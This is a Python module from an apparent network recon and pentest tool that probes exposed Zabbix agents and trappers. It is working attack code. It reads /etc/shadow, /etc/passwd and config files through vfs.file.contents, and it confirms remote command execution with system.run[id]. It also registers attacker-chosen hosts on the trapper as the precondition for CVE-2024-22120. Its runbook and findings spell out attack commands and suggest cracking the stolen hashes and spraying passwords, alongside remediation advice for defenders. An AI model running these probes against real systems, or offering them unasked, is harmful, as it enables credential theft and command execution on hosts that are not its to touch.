"""Zabbix agent (10050/tcp) + server/proxy trapper (10051/tcp) probe.

The Zabbix ZBXD protocol is a fixed 13-byte header — magic "ZBXD", 1-byte flag
(0x01 plaintext / 0x03 zlib-compressed), 8-byte little-endian body length —
followed by the request payload. The classic agent's entire access-control
model is the source-IP "Server=" allow-list; if the scanner's IP is answered
at all, the allow-list is missing or misconfigured, which unlocks:

  * inventory disclosure (system.* / vfs.* / net.*)
  * arbitrary file read (vfs.file.contents[/path])
  * pre-auth RCE (system.run[cmd] when EnableRemoteCommands=1 or
    AllowKey=system.run[*])

The server/proxy trapper on 10051 accepts JSON requests wrapped in the same
ZBXD frame. An "active checks" call with a chosen host + host_metadata
auto-creates a monitored host when TLS PSK/certificate is disabled — this
is the precondition surface for CVE-2024-22120 (SQLi in the auto-reg audit
log path).

Airgap-safe: stdlib socket + struct + json + zlib. Bounded per-probe timeout
(2-4s). No external deps.
"""
from __future__ import annotations

import json
import re
import socket
import struct
import zlib

from ..core import proxy
from ..core.known_monitoring_agents import record_monitoring_agent
from ..core.models import Host, Port


_AGENT_PORT = 10050
_TRAPPER_PORT = 10051
_TIMEOUT = 4.0
_HEADER_MAGIC = b"ZBXD"
_FLAG_PLAIN = 0x01
_FLAG_COMPRESSED = 0x03
_MAX_BODY = 262144
_HEADER_LEN = 13


def is_zabbix_agent(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == _AGENT_PORT
            or "zabbix-agent" in svc or "zabbix_agent" in svc
            or ("zabbix" in prod and "agent" in prod))


def is_zabbix_trapper(port: Port) -> bool:
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    return (port.portid == _TRAPPER_PORT
            or "zabbix-trapper" in svc or "zabbix_trapper" in svc
            or ("zabbix" in prod and ("trapper" in prod or "server" in prod)))


def is_zabbix(port: Port) -> bool:
    return is_zabbix_agent(port) or is_zabbix_trapper(port)


def _frame(payload: bytes) -> bytes:
    """Wrap a payload in a plaintext ZBXD v1 header."""
    return _HEADER_MAGIC + bytes([_FLAG_PLAIN]) + struct.pack("<Q", len(payload)) + payload


def _recv_exact(sock: socket.socket, n: int) -> bytes | None:
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(min(65536, n - len(buf)))
        except OSError:
            return None
        if not chunk:
            return None if len(buf) < n else buf
        buf += chunk
    return buf


def _recv_frame(sock: socket.socket, cap: int = _MAX_BODY) -> bytes | None:
    """Read one ZBXD frame; return the (decompressed) payload or None."""
    hdr = _recv_exact(sock, _HEADER_LEN)
    if hdr is None or len(hdr) < _HEADER_LEN or not hdr.startswith(_HEADER_MAGIC):
        return None
    flag = hdr[4]
    if flag not in (_FLAG_PLAIN, _FLAG_COMPRESSED):
        return None
    length = struct.unpack("<Q", hdr[5:13])[0]
    if length == 0:
        return b""
    length = min(length, cap)
    body = _recv_exact(sock, length)
    if body is None:
        return None
    if flag == _FLAG_COMPRESSED:
        try:
            body = zlib.decompress(body)
        except zlib.error:
            return None
    return body


def _query(ip: str, port: int, payload: bytes, timeout: float = _TIMEOUT) -> bytes | None:
    """Send one ZBXD-framed payload; return the response body or None."""
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError:
        return None
    try:
        sock.settimeout(proxy.scaled(timeout))
        try:
            sock.sendall(_frame(payload))
        except OSError:
            return None
        return _recv_frame(sock)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def agent_get(ip: str, port: int, key: str, timeout: float = _TIMEOUT) -> str | None:
    """Fetch one Zabbix agent item. Returns the value string, or None on
    unreachable / short-frame / ZBX_NOTSUPPORTED."""
    body = _query(ip, port, key.encode("utf-8", "replace"), timeout=timeout)
    if body is None:
        return None
    text = body.decode("utf-8", "replace")
    if text.startswith("ZBX_NOTSUPPORTED"):
        return None
    return text


def trapper_query(ip: str, port: int, obj: dict, timeout: float = _TIMEOUT) -> dict | None:
    body = _query(ip, port, json.dumps(obj).encode("utf-8"), timeout=timeout)
    if body is None:
        return None
    try:
        return json.loads(body.decode("utf-8", "replace"))
    except ValueError:
        return None


_INVENTORY_KEYS = (
    "system.hostname",
    "system.hostname[fqdn]",
    "system.uname",
    "system.users.num",
    "system.sw.os",
    "net.if.discovery",
    "net.tcp.listen",
    "vm.memory.size",
)

_FILE_TARGETS = (
    "/etc/passwd",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/zabbix/zabbix_agentd.conf",
    "/etc/shadow",
)


def _clean(s: str, cap: int = 4000) -> str:
    return s.replace("\x00", "").strip()[:cap]


def probe_agent(ip: str, port: int = _AGENT_PORT, timeout: float = _TIMEOUT,
                inventory: bool = True, file_read: bool = True,
                exploit: bool = False) -> dict:
    """Probe a Zabbix agent on `port`. Returns:
      {reachable, version, hostname, ping, inventory, files, server_ips,
       listeners, tls_required, remote_commands, rce_output, run_as}
    """
    out: dict = {
        "reachable": False, "version": "", "hostname": "", "ping": "",
        "inventory": {}, "files": {}, "server_ips": [], "listeners": [],
        "tls_required": False, "remote_commands": False, "rce_output": "",
        "run_as": "",
    }
    ver = agent_get(ip, port, "agent.version", timeout=timeout)
    if ver is None:
        return out
    out["reachable"] = True
    out["version"] = _clean(ver, 80)
    host = agent_get(ip, port, "agent.hostname", timeout=timeout)
    if host is not None:
        out["hostname"] = _clean(host, 120)
    ping = agent_get(ip, port, "agent.ping", timeout=timeout)
    if ping is not None:
        out["ping"] = _clean(ping, 8)

    if inventory:
        for key in _INVENTORY_KEYS:
            val = agent_get(ip, port, key, timeout=timeout)
            if val is not None:
                out["inventory"][key] = _clean(val, 1000)
        raw = out["inventory"].get("net.tcp.listen", "")
        try:
            parsed = json.loads(raw) if raw else []
            if isinstance(parsed, list):
                for item in parsed[:200]:
                    if isinstance(item, dict) and "port" in item:
                        try:
                            out["listeners"].append(int(item["port"]))
                        except (TypeError, ValueError):
                            continue
        except ValueError:
            pass

    if file_read:
        for path in _FILE_TARGETS:
            key = f"vfs.file.contents[{path}]"
            content = agent_get(ip, port, key, timeout=timeout)
            if content is None:
                continue
            out["files"][path] = _clean(content, 4000)
        conf = out["files"].get("/etc/zabbix/zabbix_agentd.conf", "")
        for line in conf.splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, _, val = line.partition("=")
            if k.strip() in ("Server", "ServerActive"):
                for peer in val.split(","):
                    hostpart = peer.strip().split(";", 1)[0].split(":", 1)[0]
                    if hostpart and hostpart not in out["server_ips"]:
                        out["server_ips"].append(hostpart)

    if exploit:
        marker = "recce-run-check"
        cmd_reply = agent_get(ip, port, f"system.run[echo {marker}]", timeout=timeout)
        if cmd_reply is not None and marker in cmd_reply:
            out["remote_commands"] = True
            out["rce_output"] = _clean(cmd_reply, 200)
            uid = agent_get(ip, port, "system.run[id]", timeout=timeout)
            if uid is not None:
                out["run_as"] = _clean(uid, 200)
    return out


def probe_trapper(ip: str, port: int = _TRAPPER_PORT, timeout: float = _TIMEOUT,
                  exploit: bool = False,
                  autoreg_host: str = "recce-probe",
                  autoreg_metadata: str = "Linux") -> dict:
    """Probe the Zabbix server/proxy trapper. Returns:
      {reachable, role, version, response, info, tls_required, autoreg_accepted}
    """
    out: dict = {"reachable": False, "role": "", "version": "",
                 "response": "", "info": "", "tls_required": False,
                 "autoreg_accepted": False}
    r = trapper_query(ip, port,
                      {"request": "active checks", "host": autoreg_host},
                      timeout=timeout)
    if r is None:
        return out
    out["reachable"] = True
    resp = str(r.get("response", ""))[:60]
    info = str(r.get("info", ""))[:500]
    out["response"] = resp
    out["info"] = info
    low = info.lower()
    if "tls" in low and ("required" in low or "no encryption" in low
                         or "connection of type" in low):
        out["tls_required"] = True
    out["role"] = "proxy" if "proxy" in low else "server"
    ver_field = r.get("version") if isinstance(r.get("version"), str) else info
    m = re.search(r"(\d+\.\d+\.\d+)", ver_field or "")
    if m:
        out["version"] = m.group(1)

    if exploit and not out["tls_required"]:
        r2 = trapper_query(ip, port, {
            "request": "active checks",
            "host": autoreg_host,
            "host_metadata": autoreg_metadata,
            "ip": "127.0.0.1",
        }, timeout=timeout)
        if isinstance(r2, dict) and str(r2.get("response", "")).lower() == "success":
            out["autoreg_accepted"] = True
    return out


def zabbix_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_zabbix_agent(p):
                out.append({"ip": h.ip, "port": p.portid, "role": "agent",
                            "version": f"{p.product} {p.version}".strip()})
            elif is_zabbix_trapper(p):
                out.append({"ip": h.ip, "port": p.portid, "role": "trapper",
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "zabbix_get", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_zabbix(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            trapper = is_zabbix_trapper(p)

            if not trapper:
                out.append(_finding(
                    "high",
                    "Zabbix agent responds to arbitrary source IPs "
                    "(Server= allow-list missing)", tgt,
                    f"Agent v{pr.get('version','?')} (hostname='{pr.get('hostname','?')}') "
                    f"answered item queries from the scanner. The agent's whole access "
                    f"model is the 'Server=' allow-list; any reply at all means that "
                    f"restriction is missing, wildcarded (0.0.0.0/0), or includes the "
                    f"scanner's subnet. Precondition for every downstream finding.",
                    f"zabbix_get -s {h.ip} -p {p.portid} -k agent.version",
                    "Set Server=<zabbix-server-ip> (single IP or narrow subnet) in "
                    "zabbix_agentd.conf and restart the agent. Never leave 0.0.0.0/0 "
                    "or a broad public range.",
                    ["CWE-284", "CWE-306"],
                    kind="zabbix_agent_allowlist_bypass"))

                inv = pr.get("inventory") or {}
                if inv:
                    hit = sorted(inv.keys())
                    sample = "; ".join(f"{k}={inv[k][:40]}" for k in hit[:4])
                    out.append(_finding(
                        "high",
                        "Zabbix agent discloses host inventory unauthenticated", tgt,
                        f"{len(hit)} inventory item(s) answered without auth: "
                        f"{', '.join(hit)}. Sample: {sample}. Feeds hostname/FQDN into "
                        f"cross-host correlation; listener list "
                        f"({len(pr.get('listeners') or [])} internal port(s)) "
                        f"cross-checks the external port map for firewalled services.",
                        f"zabbix_get -s {h.ip} -p {p.portid} -k system.uname",
                        "Restrict item keys with AllowKey/DenyKey; combine with a strict "
                        "Server= allow-list.",
                        ["CWE-200"], kind="zabbix_agent_inventory_disclosure"))

                files = pr.get("files") or {}
                if files:
                    shadow = "/etc/shadow" in files
                    conf = "/etc/zabbix/zabbix_agentd.conf" in files
                    passwd = "/etc/passwd" in files
                    extras = ""
                    if shadow:
                        extras += (" /etc/shadow was READABLE — the agent runs as root; "
                                   "feeds hashcat -m 1800 / -m 500.")
                    if conf:
                        extras += (" Agent conf disclosed Server=/ServerActive= (see "
                                   "topology finding).")
                    if passwd:
                        extras += " /etc/passwd feeds the known-user list for spraying."
                    out.append(_finding(
                        "high",
                        "Zabbix agent allows arbitrary file read via vfs.file.contents",
                        tgt,
                        f"vfs.file.contents[] returned {len(files)} file(s): "
                        f"{', '.join(sorted(files))}." + extras,
                        f"zabbix_get -s {h.ip} -p {p.portid} "
                        f"-k 'vfs.file.contents[/etc/passwd]'",
                        "Set AllowKey/DenyKey in zabbix_agentd.conf to deny "
                        "vfs.file.contents entirely, or restrict to a well-known safe "
                        "path. Run the agent as a non-privileged user (never root).",
                        ["CWE-200", "CWE-552"], kind="zabbix_agent_file_read"))

                if pr.get("remote_commands"):
                    out.append(_finding(
                        "critical",
                        "Zabbix agent EnableRemoteCommands=1 — pre-auth RCE via "
                        "system.run[]", tgt,
                        f"system.run[echo <marker>] executed and returned the marker "
                        f"verbatim. The agent has EnableRemoteCommands=1 or an explicit "
                        f"AllowKey=system.run[*]. Reply excerpt: {pr.get('rce_output','')!r}. "
                        f"Run-as: {pr.get('run_as','?')!r}.",
                        f"zabbix_get -s {h.ip} -p {p.portid} -k 'system.run[id]'",
                        "Set EnableRemoteCommands=0 in zabbix_agentd.conf and remove any "
                        "AllowKey=system.run[*]. Restart the agent. Prefer Zabbix agent 2 "
                        "with explicit plugin allowance for command execution.",
                        ["CWE-78", "CWE-306"], kind="zabbix_agent_rce"))

                if pr.get("server_ips"):
                    out.append(_finding(
                        "medium",
                        "Zabbix agent leaks Server=/ServerActive= — internal monitoring "
                        "topology disclosed", tgt,
                        f"Agent config disclosed {len(pr['server_ips'])} upstream server(s): "
                        f"{', '.join(pr['server_ips'][:10])}. Each is a pivot candidate — "
                        f"the server already trusts this agent's outbound TCP to 10051, so "
                        f"a compromised agent can send sender / auto-reg traffic to them.",
                        f"zabbix_get -s {h.ip} -p {p.portid} "
                        f"-k 'vfs.file.contents[/etc/zabbix/zabbix_agentd.conf]'",
                        "Restrict vfs.file.contents (AllowKey/DenyKey). Rotate PSKs on "
                        "the disclosed server IPs if they were reused elsewhere.",
                        ["CWE-200"], kind="zabbix_agent_topology_leak"))

            else:
                if pr.get("autoreg_accepted"):
                    out.append(_finding(
                        "critical",
                        "Zabbix server/proxy accepts unauthenticated auto-registration "
                        "(TLS PSK/cert off)", tgt,
                        f"An 'active checks' request with an attacker-chosen host + "
                        f"HostMetadata was ACCEPTED (response=success). Auto-registration "
                        f"creates monitored hosts in the server DB with no authentication. "
                        f"This is the CVE-2024-22120 precondition surface (SQLi in the "
                        f"auto-registration audit-log path). Info: {pr.get('info','')!r}.",
                        f"python3 -m recce zabbix-autoreg {h.ip} "
                        f"{p.portid} evil-host Linux",
                        "Enforce TLS PSK or certificate on the trapper "
                        "(TLSAccept=cert|psk in zabbix_server.conf). Gate/disable "
                        "auto-registration actions that match arbitrary HostMetadata. "
                        "Upgrade to the current LTS to close CVE-2024-22120.",
                        ["CWE-306", "CWE-89"], kind="zabbix_autoreg_accepted"))
                if pr.get("tls_required"):
                    out.append(_finding(
                        "info", "Zabbix trapper enforces TLS PSK / certificate", tgt,
                        f"Trapper refused plaintext with a TLS-required error "
                        f"({pr.get('info','')!r}). Auto-reg abuse blocked at this port.",
                        "-",
                        "Keep TLS enforced; rotate PSKs on schedule.",
                        [], kind="zabbix_trapper_tls_enforced"))
                out.append(_finding(
                    "info", "Zabbix trapper reachable — fingerprint recorded", tgt,
                    f"Trapper role={pr.get('role','?')} version={pr.get('version','?')} "
                    f"response={pr.get('response','?')} info={pr.get('info','')!r}",
                    f"python3 -c \"import socket,struct,json;"
                    f"s=socket.create_connection(('{h.ip}',{p.portid}));"
                    f"p=json.dumps({{'request':'active checks','host':'probe'}}).encode();"
                    f"s.sendall(b'ZBXD\\x01'+struct.pack('<Q',len(p))+p);print(s.recv(4096))\"",
                    "Restrict trapper to the monitoring subnet; enforce TLS PSK / cert.",
                    [], kind="zabbix_trapper_fingerprint"))

            if not pr.get("tls_required"):
                out.append(_finding(
                    "medium",
                    "Zabbix agent/server communication is plaintext (no TLS PSK/cert)",
                    tgt,
                    f"The {'trapper' if trapper else 'agent'} accepted an unencrypted "
                    f"ZBXD frame. Item keys, values, and file contents traverse the wire "
                    f"in cleartext; an on-path observer captures hostname, inventory, "
                    f"and any file read. Also permits every finding above.",
                    (f"zabbix_get -s {h.ip} -p {p.portid} -k agent.ping   "
                     f"# succeeds -> no TLS") if not trapper else
                    f"# send plaintext ZBXD to {h.ip}:{p.portid} — accepted -> no TLS",
                    "Enable TLSConnect / TLSAccept with PSK or certificate; distribute "
                    "PSKs via config management; rotate on schedule.",
                    ["CWE-319"], kind="zabbix_plaintext"))
    return out


def runbook(ip: str, port: int) -> list[dict]:
    if port == _TRAPPER_PORT:
        return [
            {"step": "Trapper fingerprint (active-checks reply)",
             "cmd": (f"python3 -c \"import socket,struct,json;"
                     f"p=json.dumps({{'request':'active checks','host':'recce-probe'}})"
                     f".encode();s=socket.create_connection(('{ip}',{port}));"
                     f"s.sendall(b'ZBXD\\x01'+struct.pack('<Q',len(p))+p);"
                     f"print(s.recv(4096))\"")},
            {"step": "Auto-registration abuse (unauth host create if TLS off)",
             "cmd": (f"python3 -c \"import socket,struct,json;"
                     f"p=json.dumps({{'request':'active checks','host':'evil-1',"
                     f"'host_metadata':'Linux'}}).encode();"
                     f"s=socket.create_connection(('{ip}',{port}));"
                     f"s.sendall(b'ZBXD\\x01'+struct.pack('<Q',len(p))+p);"
                     f"print(s.recv(4096))\"")},
        ]
    return [
        {"step": "Agent version + hostname + ping",
         "cmd": (f"for k in agent.version agent.hostname agent.ping; do "
                 f"zabbix_get -s {ip} -p {port} -k \"$k\"; done")},
        {"step": "Inventory (OS / users / interfaces / listeners)",
         "cmd": (f"for k in system.uname system.users.num system.sw.os "
                 f"net.tcp.listen; do zabbix_get -s {ip} -p {port} -k \"$k\"; done")},
        {"step": "Arbitrary file read (agent conf + /etc/passwd)",
         "cmd": (f"zabbix_get -s {ip} -p {port} "
                 f"-k 'vfs.file.contents[/etc/zabbix/zabbix_agentd.conf]'")},
        {"step": "RCE test (only when EnableRemoteCommands=1)",
         "cmd": f"zabbix_get -s {ip} -p {port} -k 'system.run[id]'"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "zabbix", _AGENT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            exploit: bool = False) -> dict:
    """Analyze all Zabbix agent + trapper targets. `exploit=True` enables the
    system.run[] RCE probe and the trapper auto-registration probe — gate the
    caller behind the same --exploit flag other RCE probes use."""
    from . import svcprobe
    targets = zabbix_targets(hosts)
    probes: dict = {}
    state: dict = {}

    def _one(t):
        if t["role"] == "trapper":
            return probe_trapper(t["ip"], t["port"], exploit=exploit)
        return probe_agent(t["ip"], t["port"], exploit=exploit)

    if active:
        for t, pr in svcprobe.iter_probe(targets, _one,
                                         budget=budget, progress=progress,
                                         state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", "") or t.get("version", "")
                if t["role"] == "agent":
                    t["hostname"] = pr.get("hostname", "")
                    t["file_read"] = bool(pr.get("files"))
                    t["remote_commands"] = pr.get("remote_commands", False)
                    t["server_ips"] = list(pr.get("server_ips") or [])
                else:
                    t["autoreg"] = pr.get("autoreg_accepted", False)
                    t["tls_required"] = pr.get("tls_required", False)
                # Feed the cross-service monitoring-agent correlator so a
                # compromised agent surfaces as a pivot signal for the
                # whole fleet the same server monitors.
                if pr.get("reachable"):
                    kind = ("zabbix-trapper" if t["role"] == "trapper"
                            else "zabbix-agent")
                    # Agent responding at all from the scanner IP = the
                    # Server= allow-list is bypassed (not gated). Trapper
                    # is gated iff TLS PSK/cert is enforced.
                    gated = bool(pr.get("tls_required", False))
                    for h in hosts:
                        if h.ip == t["ip"]:
                            record_monitoring_agent(
                                h, t["port"], kind,
                                version=pr.get("version", ""),
                                gated=gated,
                                server_hints=list(pr.get("server_ips") or []),
                                source="zabbix")
                            break
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
